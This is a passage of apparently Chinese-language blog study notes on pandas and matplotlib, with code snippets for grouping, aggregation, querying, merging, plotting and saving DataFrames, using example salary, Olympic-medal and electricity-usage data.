class="string">&quot;industryField&quot;</span>].apply(<span class="keyword">lambda</span> x: x.<span class="built_in">str</span>.contains(<span class="string">&#x27;电商&#x27;</span>).<span class="built_in">sum</span>())</span><br><span class="line"><span class="comment"># 计算各行政区的企业领域（industryField）包含电商的总数</span></span><br><span class="line">df.groupby(<span class="string">&quot;district&quot;</span>, sort=<span class="literal">False</span>)[<span class="string">&quot;industryField&quot;</span>].apply(</span><br><span class="line"><span class="keyword">lambda</span> x: x.<span class="built_in">str</span>.contains(<span class="string">&quot;电商&quot;</span>).<span class="built_in">sum</span>())</span><br><span class="line"><span class="comment">#通过 positionName 的长度进行分组，并计算不同长度岗位名称的薪资均值</span></span><br><span class="line">df.set_index(<span class="string">&quot;positionName&quot;</span>).groupby(<span class="built_in">len</span>)[<span class="string">&#x27;salary&#x27;</span>].mean()</span><br><span class="line">df.groupby(df.positionName.apply(<span class="keyword">lambda</span> x:<span class="built_in">len</span>(x)))[<span class="string">&#x27;salary&#x27;</span>].mean()</span><br><span class="line"><span class="comment"># groupby 直接改名</span></span><br><span class="line">df.groupby(&#123;<span class="string">&#x27;salary&#x27;</span>:<span class="string">&#x27;薪资&#x27;</span>,<span class="string">&#x27;score&#x27;</span>:<span class="string">&#x27;总分&#x27;</span>,<span class="string">&#x27;matchScore&#x27;</span>:<span class="string">&#x27;总分&#x27;</span>&#125;, axis=<span class="number">1</span>).<span class="built_in">sum</span>()</span><br><span class="line"><span class="comment"># groupby 用字典</span></span><br><span class="line"><span class="comment">#将 score 和 matchScore 的和记为总分，与 salary 列同时进行分组，并查看结果</span></span><br><span class="line">df.groupby(&#123;<span class="string">&#x27;salary&#x27;</span>:<span class="string">&#x27;薪资&#x27;</span>,<span class="string">&#x27;score&#x27;</span>:<span class="string">&#x27;总分&#x27;</span>,<span class="string">&#x27;matchScore&#x27;</span>:<span class="string">&#x27;总分&#x27;</span>&#125;, axis=<span class="number">1</span>).<span class="built_in">sum</span>()</span><br><span class="line"><span class="comment"># 聚合</span></span><br><span class="line">df[<span class="string">&#x27;salary&#x27;</span>].groupby(df[<span class="string">&#x27;district&#x27;</span>]).mean() </span><br><span class="line"><span class="comment"># 等价</span></span><br><span class="line">df[[<span class="string">&#x27;district&#x27;</span>,<span class="string">&#x27;salary&#x27;</span>]].groupby(<span class="string">&#x27;district&#x27;</span>).mean()</span><br><span class="line"><span class="comment"># 在原数据框 df 新增一列，数值为该区的平均薪资水平</span></span><br><span class="line">df[<span class="string">&#x27;该区平均工资&#x27;</span>] = df[[<span class="string">&#x27;district&#x27;</span>,<span class="string">&#x27;salary&#x27;</span>]].groupby(by=<span class="string">&#x27;district&#x27;</span>).transform(<span class="string">&#x27;mean&#x27;</span>)</span><br><span class="line"><span class="comment"># 提取平均工资小于 30000 的行政区的全部数据</span></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>).<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x[<span class="string">&#x27;salary&#x27;</span>].mean() &lt; <span class="number">30000</span>)</span><br><span class="line"><span class="comment"># 分组计算不同行政区，薪水的最小值、最大值和平均值</span></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>)[<span class="string">&#x27;salary&#x27;</span>].agg([<span class="built_in">min</span>, <span class="built_in">max</span>, np.mean])</span><br><span class="line"><span class="comment"># 对不同行政区进行分组，并统计薪水的均值、中位数、方差，以及得分的均值</span></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>).agg(</span><br><span class="line">    &#123;<span class="string">&#x27;salary&#x27;</span>: [np.mean, np.median, np.std], <span class="string">&#x27;score&#x27;</span>: np.mean&#125;)</span><br><span class="line"><span class="comment"># 通过 df2 计算获得奖牌最多的运动员</span></span><br><span class="line">df2[<span class="string">&#x27;运动员&#x27;</span>].value_counts().sort_values(ascending=<span class="literal">False</span>).head(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 查看各国在不同项目上的获奖牌情况</span></span><br><span class="line">df2[<span class="string">&#x27;总奖牌数&#x27;</span>].groupby([df2[<span class="string">&#x27;国家&#x27;</span>],df2[<span class="string">&#x27;运动类别&#x27;</span>]]).count().to_frame()</span><br><span class="line">df2.groupby([<span class="string">&#x27;国家&#x27;</span>,<span class="string">&#x27;运动类别&#x27;</span>]).count()[<span class="string">&#x27;总奖牌数&#x27;</span>].to_frame()</span><br><span class="line">pd.pivot_table(df2,values = [<span class="string">&#x27;奖牌类型&#x27;</span>],index = [<span class="string">&#x27;国家&#x27;</span>,<span class="string">&#x27;运动类别&#x27;</span>],aggfunc = <span class="string">&#x27;count&#x27;</span>)</span><br><span class="line"><span class="comment"># 按照行计算平均值</span></span><br><span class="line">df.mean(axis=<span class="string">&#x27;columns&#x27;</span>)</span><br><span class="line">df.mean(axis=<span class="number">1</span>) <span class="comment">#不是0，1是算每列的均值然后然后合并为一行</span></span><br><span class="line"><span class="comment"># 提取平均工资小于 30000 的行政区的全部数据</span></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>).<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x[<span class="string">&#x27;salary&#x27;</span>].mean() &lt; <span class="number">30000</span>)</span><br><span class="line"><span class="comment"># 聚合统计</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>)[<span class="string">&#x27;salary&#x27;</span>].agg([<span class="built_in">min</span>, <span class="built_in">max</span>, np.mean])</span><br><span class="line"><span class="comment">#查看缺失值比例，并排序  不是count！！！</span></span><br><span class="line">data = df.isna().<span class="built_in">sum</span>()/df.shape[<span class="number">0</span>]</span><br><span class="line">data.sort_values().<span class="built_in">map</span>(<span class="keyword">lambda</span> x:<span class="string">&quot;&#123;:.2%&#125;&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line"><span class="comment">#对不同岗位(positionName)进行分组，并统计其薪水(salary)中位数和得分(score)均值</span></span><br><span class="line">df.groupby(<span class="string">&#x27;positionName&#x27;</span>).agg(&#123;<span class="string">&#x27;salary&#x27;</span>: np.median, <span class="string">&#x27;score&#x27;</span>: np.mean&#125;)</span><br><span class="line"><span class="comment"># 自定义函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myfunc</span>(<span class="params">x</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> x.<span class="built_in">max</span>()-x.mean()</span><br><span class="line"></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>).agg(最低工资=(<span class="string">&#x27;salary&#x27;</span>, <span class="string">&#x27;min&#x27;</span>), 最高工资=(</span><br><span class="line">    <span class="string">&#x27;salary&#x27;</span>, <span class="string">&#x27;max&#x27;</span>), 平均工资=(<span class="string">&#x27;salary&#x27;</span>, <span class="string">&#x27;mean&#x27;</span>), 最大值与均值差值=(<span class="string">&#x27;salary&#x27;</span>, myfunc)).rename_axis([<span class="string">&quot;行政区&quot;</span>])</span><br></pre></td></tr></table></figure><h3><span id="数据查询">数据查询</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询某列的值为x时，即使该列为坐标</span></span><br><span class="line"><span class="comment">#查询中国队的获奖牌</span></span><br><span class="line">df3.query(<span class="string">&quot;国家 == [&#x27;中国&#x27;]&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算中国每日总奖牌数量 累计</span></span><br><span class="line">df2.groupby([<span class="string">&#x27;获奖时间&#x27;</span>,<span class="string">&#x27;国家&#x27;</span>]).count()[<span class="string">&#x27;奖牌类型&#x27;</span>].to_frame().query(<span class="string">&#x27;国家==[&quot;中国&quot;]&#x27;</span>).cumsum()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#查询空值所在行</span></span><br><span class="line">df[df.isnull().T.<span class="built_in">any</span>() == <span class="literal">True</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看重复的</span></span><br><span class="line">df[df.duplicated()]</span><br><span class="line"></span><br><span class="line"><span class="comment">#查询条件</span></span><br><span class="line">df_01.loc[df_01[<span class="string">&#x27;行业（按行业大类）&#x27;</span>].isin([<span class="string">&#x27;工业&#x27;</span>,<span class="string">&#x27;建筑业&#x27;</span>])]</span><br><span class="line">df_01.loc[(df_01[<span class="string">&#x27;行业（按行业大类）&#x27;</span>]==<span class="string">&#x27;工业&#x27;</span>)|(df_01[<span class="string">&#x27;行业（按行业大类）&#x27;</span>]==<span class="string">&#x27;建筑业&#x27;</span>)]</span><br><span class="line">df_01[df_01[<span class="string">&#x27;行业（按行业大类）&#x27;</span>].<span class="built_in">str</span>.contains(<span class="string">&#x27;工业|建筑业&#x27;</span>)]</span><br></pre></td></tr></table></figure><h3><span id="数据汇总">数据汇总</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 计算 总分、高端人才得分、办学层次得分的最大最小值、中位数、均值</span></span><br><span class="line">df.agg(&#123;</span><br><span class="line">        <span class="string">&quot;总分&quot;</span>: [<span class="string">&quot;min&quot;</span>, <span class="string">&quot;max&quot;</span>, <span class="string">&quot;median&quot;</span>, <span class="string">&quot;mean&quot;</span>],</span><br><span class="line">        <span class="string">&quot;高端人才得分&quot;</span>: [<span class="string">&quot;min&quot;</span>, <span class="string">&quot;max&quot;</span>, <span class="string">&quot;median&quot;</span>, <span class="string">&quot;mean&quot;</span>],</span><br><span class="line">        <span class="string">&quot;办学层次得分&quot;</span>:[<span class="string">&quot;min&quot;</span>, <span class="string">&quot;max&quot;</span>, <span class="string">&quot;median&quot;</span>, <span class="string">&quot;mean&quot;</span>]&#125;)</span><br></pre></td></tr></table></figure><h3><span id="数据合并">数据合并</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 垂直拼接 df1、df2、df3，效果如下图所示</span></span><br><span class="line">pd.concat([df1, df2, df3])</span><br><span class="line"><span class="comment"># 垂直拼接 df1 和 df4，并按顺序重新生成索引，</span></span><br><span class="line">df = pd.concat([df1,df4]).reset_index()</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">df = pd.concat([df1, df4], ignore_index=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 横向拼接</span></span><br><span class="line">pd.concat([df1,df4],axis=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 在上一题的基础上，只取结果的交集</span></span><br><span class="line">pd.concat([df1,df4],axis=<span class="number">1</span>,join=<span class="string">&#x27;inner&#x27;</span>)</span><br><span class="line"><span class="comment"># 只取包含 df1 索引的部分</span></span><br><span class="line">pd.concat([df1, df4], axis=<span class="number">1</span>).reindex(df1.index)</span><br><span class="line"><span class="comment"># 拼接 df1、df2、df3，同时新增一个索引（x、y、z）来区分不同的表数据来源</span></span><br><span class="line">pd.concat([df1, df2, df3], keys=[<span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>])</span><br><span class="line"><span class="comment"># 根据 key 连接 left 和 right</span></span><br><span class="line">pd.merge(left, right, on=<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line"><span class="comment"># 根据 key1 和 key2 连接 left 和 right</span></span><br><span class="line">pd.merge(left, right, on=[<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>])</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">how 可以设置</span></span><br><span class="line"><span class="string">right、left: 左外，右外</span></span><br><span class="line"><span class="string">outer、inner: 全外连接，内连接</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pd.merge(left, right, how=<span class="string">&#x27;left&#x27;</span>, on=[<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>])</span><br><span class="line"><span class="comment"># 重新产生数据</span></span><br><span class="line">left.join(right, on=[<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>])</span><br></pre></td></tr></table></figure><h3><span id="多个df画一起">多个DF画一起</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fig, ax = plt.subplots(figsize=(<span class="number">16</span>,<span class="number">10</span>))   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_percent</span>(<span class="params">temp, position</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;%1.0f&#x27;</span>%(<span class="number">100</span>*temp) + <span class="string">&#x27;%&#x27;</span></span><br><span class="line">plt.gca().yaxis.set_major_formatter(FuncFormatter(to_percent))</span><br><span class="line">ax.plot(max_data,label=<span class="string">&#x27;first one&#x27;</span>)</span><br><span class="line">ax.plot(min_data,label=<span class="string">&#x27;last one&#x27;</span>)</span><br><span class="line">ax.plot(q3_df,label=<span class="string">&#x27;mean&#x27;</span>)</span><br><span class="line">ax.set_title(<span class="string">&#x27;Daily Empty Rate Comparison For Village Y&#x27;</span>)</span><br><span class="line">plt.legend(loc=<span class="string">&#x27;best&#x27;</span>)</span><br><span class="line">plt.savefig(<span class="string">&#x27;C-4.png&#x27;</span>)</span><br></pre></td></tr></table></figure><h3><span id="分析和排序">分析和排序</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将空置率从低到高排序</span></span><br><span class="line">q1_df=q1_df.sort_values(<span class="string">&#x27;AT_HOME&#x27;</span>)</span><br><span class="line"><span class="comment"># 参数by可以忽略</span></span><br><span class="line">df.sort_values(by=<span class="string">&#x27;总分&#x27;</span>, ascending=<span class="literal">True</span>).head(<span class="number">20</span>)</span><br><span class="line"><span class="comment"># 查看各项得分最高的学校名称</span></span><br><span class="line">df.iloc[:,<span class="number">3</span>:].idxmax()</span><br><span class="line"><span class="comment"># 统计 总分 列的均值</span></span><br><span class="line">df[<span class="string">&#x27;总分&#x27;</span>].mean()</span><br><span class="line">df.总分.mean()</span><br><span class="line"><span class="comment"># 计算总分列的中位数</span></span><br><span class="line">df.总分.median()</span><br><span class="line"><span class="comment"># 计算总分列的众数</span></span><br><span class="line">df.总分.mode()</span><br><span class="line"><span class="comment"># 查看数值型数据的统计信息（均值、分位数等），并保留两位小数</span></span><br><span class="line">df.describe().<span class="built_in">round</span>(<span class="number">2</span>).T</span><br></pre></td></tr></table></figure><h3><span id="双纵坐标轴">双纵坐标轴</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入data.csv</span></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;data.csv&#x27;</span>)</span><br><span class="line"><span class="comment"># 将Date转为日期格式</span></span><br><span class="line">df[<span class="string">&#x27;Date&#x27;</span>] = pd.to_datetime(df[<span class="string">&#x27;Date&#x27;</span>])</span><br><span class="line"><span class="comment"># 优化df的结构</span></span><br><span class="line">df=df.reset_index(drop=<span class="literal">True</span>).set_index(<span class="string">&#x27;Date&#x27;</span>)</span><br><span class="line"><span class="comment"># 选择数据范围 2014年1月1日至2018年7月31日</span></span><br><span class="line">q1_df = df[<span class="string">&#x27;2014-01-01&#x27;</span>:<span class="string">&#x27;2018-07-31&#x27;</span>]</span><br><span class="line"><span class="comment"># 构建画图使用的dataframe 每天的日电量、最高温度、最低温度</span></span><br><span class="line">q1_plot_df = q1_df[[<span class="string">&#x27;DailyElectricity&#x27;</span>,<span class="string">&#x27;MaxTemperature&#x27;</span>,<span class="string">&#x27;MinTemperature&#x27;</span>]]</span><br><span class="line"><span class="comment"># 画图</span></span><br><span class="line">fig,ax = plt.subplots(figsize=(<span class="number">10</span>,<span class="number">8</span>))</span><br><span class="line">ax.plot(df[<span class="string">&#x27;DailyElectricity&#x27;</span>],color=<span class="string">&#x27;r&#x27;</span>,label=<span class="string">&#x27;DailyElectricity&#x27;</span>)</span><br><span class="line"><span class="comment"># 镜像x轴</span></span><br><span class="line">ax2 = ax.twinx()</span><br><span class="line">ax2.plot(df[<span class="string">&#x27;MaxTemperature&#x27;</span>],color=<span class="string">&#x27;b&#x27;</span>,label=<span class="string">&#x27;MaxTemperature&#x27;</span>)</span><br><span class="line">ax2.plot(df[<span class="string">&#x27;MinTemperature&#x27;</span>],color=<span class="string">&#x27;g&#x27;</span>,label=<span class="string">&#x27;MinTemperature&#x27;</span>)</span><br><span class="line"><span class="comment"># 添加图例</span></span><br><span class="line">ax.legend(loc=<span class="string">&#x27;best&#x27;</span>)</span><br><span class="line">ax2.legend(loc=<span class="string">&#x27;best&#x27;</span>)</span><br><span class="line">ax.set_title(<span class="string">&#x27;Daily Usage and Temperature&#x27;</span>)</span><br><span class="line">plt.savefig(<span class="string">&#x27;F-1.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="构建空df">构建空DF</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">max_data = pd.DataFrame(columns=&#123;<span class="string">&#x27;DATA_DATE&#x27;</span>,<span class="string">&#x27;empty_ratio&#x27;</span>&#125;)</span><br><span class="line">min_data = pd.DataFrame(columns=&#123;<span class="string">&#x27;DATA_DATE&#x27;</span>,<span class="string">&#x27;empty_ratio&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(q4_df)):</span><br><span class="line">    indx = q4_df.index[i][<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    val = q4_df.iloc[i][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> indx == <span class="string">&#x27;Street A&#x27;</span>:</span><br><span class="line">        max_data = max_data.append([&#123;<span class="string">&#x27;DATA_DATE&#x27;</span>:q4_df.index[i][<span class="number">0</span>],<span class="string">&#x27;empty_ratio&#x27;</span>:val&#125;],ignore_index=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> indx == <span class="string">&#x27;Street G&#x27;</span>:</span><br><span class="line">        min_data = min_data.append(&#123;<span class="string">&#x27;DATA_DATE&#x27;</span>:q4_df.index[i][<span class="number">0</span>],<span class="string">&#x27;empty_ratio&#x27;</span>:val&#125;,ignore_index=<span class="literal">True</span>)</span><br><span class="line">        </span><br><span class="line">max_data=max_data.reset_index(drop=<span class="literal">True</span>).set_index(max_data[<span class="string">&#x27;DATA_DATE&#x27;</span>]).drop(<span class="string">&#x27;DATA_DATE&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">min_data=min_data.reset_index(drop=<span class="literal">True</span>).set_index(min_data[<span class="string">&#x27;DATA_DATE&#x27;</span>]).drop(<span class="string">&#x27;DATA_DATE&#x27;</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 新建df 方法一</span></span><br><span class="line"></span><br><span class="line">cols_q3=[<span class="string">&#x27;类别&#x27;</span>,<span class="string">&#x27;本周电量&#x27;</span>,<span class="string">&#x27;上周周电量&#x27;</span>,<span class="string">&#x27;环比提升&#x27;</span>,<span class="string">&#x27;农历同期周电量&#x27;</span>,<span class="string">&#x27;同比提升&#x27;</span>]</span><br><span class="line">q3_df = pd.DataFrame(columns=cols_q3)</span><br><span class="line">q3_df.loc[<span class="number">0</span>]=np.nan <span class="comment">#先新建一列</span></span><br><span class="line">q3_df.iloc[<span class="number">0</span>,<span class="number">0</span>] = <span class="string">&#x27;软件园一期&#x27;</span> <span class="comment"># 第一次要iloc</span></span><br><span class="line">q3_df.loc[<span class="number">1</span>] = <span class="string">&#x27;软件园二期&#x27;</span>   <span class="comment"># 后面可以用iloc来做</span></span><br><span class="line">q3_df.loc[<span class="number">2</span>] = <span class="string">&#x27;软件园三期&#x27;</span></span><br><span class="line">q3_df.loc[<span class="number">3</span>] = <span class="string">&#x27;医药制造&#x27;</span>q3_df.iloc[<span class="number">0</span>,<span class="number">1</span>] = bz_factory.iloc[<span class="number">1</span>,<span class="number">1</span>].<span class="built_in">round</span>(<span class="number">2</span>)</span><br><span class="line">q3_df.iloc[<span class="number">0</span>,<span class="number">2</span>] = sz_factory[<span class="string">&#x27;上周周电量&#x27;</span>][<span class="number">0</span>].<span class="built_in">round</span>(<span class="number">2</span>)</span><br><span class="line">q3_df.iloc[<span class="number">0</span>,<span class="number">3</span>] = (bz_factory.iloc[<span class="number">1</span>,<span class="number">1</span>]-sz_factory[<span class="string">&#x27;上周周电量&#x27;</span>][<span class="number">0</span>])/sz_factory[<span class="string">&#x27;上周周电量&#x27;</span>][<span class="number">0</span>]</span><br><span class="line">q3_df.iloc[<span class="number">0</span>,<span class="number">4</span>] = nl_factory.iloc[<span class="number">1</span>,<span class="number">1</span>].<span class="built_in">round</span>(<span class="number">2</span>)</span><br><span class="line">q3_df.iloc[<span class="number">0</span>,<span class="number">5</span>] = (bz_factory.iloc[<span class="number">1</span>,<span class="number">1</span>]-nl_factory.iloc[<span class="number">1</span>,<span class="number">1</span>])/nl_factory.iloc[<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line"><span class="comment"># 新建df 方法二直接concat</span></span><br><span class="line">q1_df.loc[<span class="number">0</span>]=np.nan</span><br><span class="line">tmp_df.loc[<span class="number">0</span>]=np.nan</span><br><span class="line"></span><br><span class="line">q1_df.iloc[<span class="number">0</span>,<span class="number">0</span>] = <span class="string">&#x27;工业&#x27;</span></span><br><span class="line">tmp_df.iloc[<span class="number">0</span>,<span class="number">0</span>] = <span class="string">&#x27;建筑业&#x27;</span></span><br><span class="line"></span><br><span class="line">q1_df.iloc[<span class="number">0</span>,<span class="number">1</span>]=bz_gy[<span class="string">&#x27;开工指数&#x27;</span>].<span class="built_in">round</span>(<span class="number">2</span>)</span><br><span class="line">tmp_df.iloc[<span class="number">0</span>,<span class="number">1</span>]=bz_jz[<span class="string">&#x27;开工指数&#x27;</span>].<span class="built_in">round</span>(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">q1_df = pd.concat([q1_df,tmp_df],axis=<span class="number">0</span>)</span><br><span class="line">q1_df.to_csv(<span class="string">&#x27;Q2-1.csv&#x27;</span>,index=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将一列添加到一个新的df里面，需要保证！！！index一致！！！ 否则加不进去</span></span><br><span class="line"><span class="comment"># q2_df</span></span><br><span class="line">cols_q2 = [<span class="string">&#x27;类别&#x27;</span>,<span class="string">&#x27;本周电量&#x27;</span>,<span class="string">&#x27;上周周电量&#x27;</span>,<span class="string">&#x27;环比提升&#x27;</span>,<span class="string">&#x27;农历同期周电量&#x27;</span>,<span class="string">&#x27;同比提升&#x27;</span>]</span><br><span class="line">q2_df = pd.DataFrame(columns=cols_q2)</span><br><span class="line">q2_df[<span class="string">&#x27;类别&#x27;</span>]=usage_bz.T.index</span><br><span class="line">q2_df[<span class="string">&#x27;本周电量&#x27;</span>]=usage_bz.T.reset_index()[<span class="string">&#x27;厦门市&#x27;</span>] <span class="comment">#要先reset_index</span></span><br><span class="line">q2_df</span><br></pre></td></tr></table></figure><h3><span id="更改日期间隔">更改日期间隔</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更改日期间隔</span></span><br><span class="line">plt.xticks(pd.date_range(<span class="string">&#x27;2021-01-01&#x27;</span>,<span class="string">&#x27;2021-03-31&#x27;</span>,freq=<span class="string">&#x27;20D&#x27;</span>))</span><br></pre></td></tr></table></figure><h3><span id="查看统计数据">查看统计数据</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看数据行列数</span></span><br><span class="line">df.shape</span><br><span class="line"><span class="comment"># 查看数据量</span></span><br><span class="line">df.size</span><br><span class="line"><span class="comment"># 查看 数值型 列的统计信息，计数、均值什么的</span></span><br><span class="line">df.describe()</span><br><span class="line"><span class="comment"># 查看 离散型 列的统计信息，计数、频率什么</span></span><br><span class="line">df.describe(include=[<span class="string">&#x27;O&#x27;</span>])</span><br><span class="line"><span class="comment"># 查看 全部 列的统计信息</span></span><br><span class="line">df.describe(include=<span class="string">&#x27;all&#x27;</span>)</span><br></pre></td></tr></table></figure><h3><span id="保存文件">保存文件</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不保存索引</span></span><br><span class="line">data.to_csv(<span class="string">&quot;out.csv&quot;</span>,encoding = <span class="string">&#x27;utf_8_sig&#x27;</span>,index = <span class="literal">False</span>)</span><br><span class="line"><span class="comment"># 保存指定列</span></span><br><span class="line">data.to_csv(<span class="string">&quot;out.csv&quot;</span>,encoding = <span class="string">&#x27;utf_8_sig&#x27;</span>,columns=[<span class="string">&#x27;positionName&#x27;</span>,<span class="string">&#x27;salary&#x27;</span>])</span><br><span class="line"><span class="comment"># 小数点</span></span><br><span class="line">mar.to_csv(<span class="string">&quot;2-1.csv&quot;</span>, index=<span class="literal">False</span>, float_format=<span class="string">&#x27;%.3f&#x27;</span>)</span><br></pre></td></tr></table></figure><h3><span id="数据预处理">数据预处理</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 